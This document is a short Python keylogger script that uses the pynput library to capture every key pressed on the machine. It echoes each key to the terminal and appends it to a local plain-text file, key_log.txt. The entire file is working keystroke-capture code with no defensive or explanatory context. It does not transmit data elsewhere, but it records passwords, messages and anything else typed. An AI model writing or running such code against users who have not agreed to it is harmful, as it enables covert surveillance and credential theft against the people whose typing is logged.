from pynput.keyboard import Listener

log_file = "./key_log.txt"

def log_key(key):
    try:
        # Print each key to the terminal
        print(f"Key pressed: {key.char}")
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:  # For special keys like 'Enter', 'space'
        print(f"Special key pressed: {key}")
        with open(log_file, "a") as f:
            f.write(f" {key} ")

# Set up the listener to monitor keystrokes
with Listener(on_press=log_key) as listener:
    listener.join()
